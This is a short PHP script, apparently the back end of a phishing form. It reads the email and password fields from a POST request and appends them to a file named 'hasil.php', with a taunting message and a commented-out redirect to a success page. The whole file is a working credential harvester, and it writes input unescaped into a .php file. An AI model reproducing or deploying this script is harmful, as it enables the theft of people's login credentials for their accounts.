<?php

//header("Location: succes.php");
echo "<p>mau ngapain ya.</p>";
$hasil = "hasil.php";
$email = $_POST['email'];
$password = $_POST['pass']; 

$handle = fopen($hasil, 'a');
fwrite($handle, "\n");
fwrite($handle, "<br>Email  :");
fwrite($handle, "\n");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "<br>Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>